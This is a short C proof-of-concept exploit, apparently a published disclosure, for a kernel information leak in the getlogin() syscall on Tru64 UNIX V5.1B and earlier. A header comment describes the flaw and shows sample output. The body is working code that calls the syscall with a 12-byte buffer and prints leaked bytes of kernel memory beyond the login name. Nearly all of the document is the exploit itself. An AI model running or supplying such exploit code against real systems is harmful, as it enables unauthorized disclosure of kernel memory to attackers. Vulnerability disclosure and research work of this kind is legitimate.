/*Tru64 V5.1B & below getlogin() kernel information leak
* ======================================================
* Tru64 contains an information leak in the getlogin() 
* BSD syscall. This vulnerability is present in all vers
* of Tru64 tested upto V5.1B. An attacker can leak some
* kernel memory of internal struct upto 12 bytes minus 
* login name. 
*
* # uname -a
* OSF1 tru64 V5.1 2650 alpha
* # ./getlogin
* 0x72 0x6f 0x6f 0x74 0x0 0xfe 0xff 0xff 0x80 0xb8 0x68 0x1e
*
* -- Hacker Fantastic (https://hacker.house)
*/
#include <stdio.h>
#include <stdlib.h>
#include <sys/syscall.h>
#include <unistd.h>

int main(){
	char leak;
	void* ret, *buffer = malloc(13);
	if(!buffer)
		exit(-1);
	memset(buffer,0,13);
	ret = syscall(SYS_getlogin,buffer,12);
	for(int c = 0;c < 12;c++){
		memcpy(&leak,buffer,1);
		printf("0x%hx ",leak & 0xff);
		(long)buffer+=1;
	}
	printf("\n");
	exit(0);
}
